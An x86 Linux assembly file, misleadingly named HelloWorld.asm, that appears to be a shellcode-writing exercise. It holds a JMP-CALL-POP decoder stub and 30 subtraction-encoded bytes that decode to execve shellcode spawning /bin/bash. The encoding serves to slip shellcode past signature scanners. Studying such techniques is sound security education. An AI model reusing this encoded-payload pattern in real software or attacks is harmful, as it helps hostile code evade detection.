; HelloWorld.asm
; Author: TrulyOutrageous

global _start

section .text
_start:

	; jump to the segment of code that defines the encoded shellcode in memory to start the JMP-CALL-POP process to load the encoded shellcode bytes into memory
	jmp short call_decoder

decoder:
	; "pop" the memory address to encoded shellcode off the stack into a registers
	pop esi
	
	; set up the counter. The shellcode is 30 bytes long, so set the counter to 30 
	xor ecx,ecx
	mov cl,30

decode:
	; this will subtract the encoded byte by the amount rotated by the encoder
	sub byte [esi], 0x2 ; replace 0x2 with the number you used to encode with
	inc esi
	loop decode

	jmp short shellcode	

call_decoder:
	; call the decoder section of the code. This puts memory location of the encoded shellcode on the stack
	call decoder
	; Place the shellcode bytes in memory using define bytes. This will need to be decoded
	shellcode: db 0x33,0xc2,0x52,0x6a,0x64,0x63,0x75,0x6a,0x6a,0x64,0x6b,0x70,0x31,0x6a,0x31,0x31,0x31,0x31,0x8b,0xe5,0x52,0x8b,0xe4,0x55,0x8b,0xe3,0xb2,0x0d,0xcf,0x82
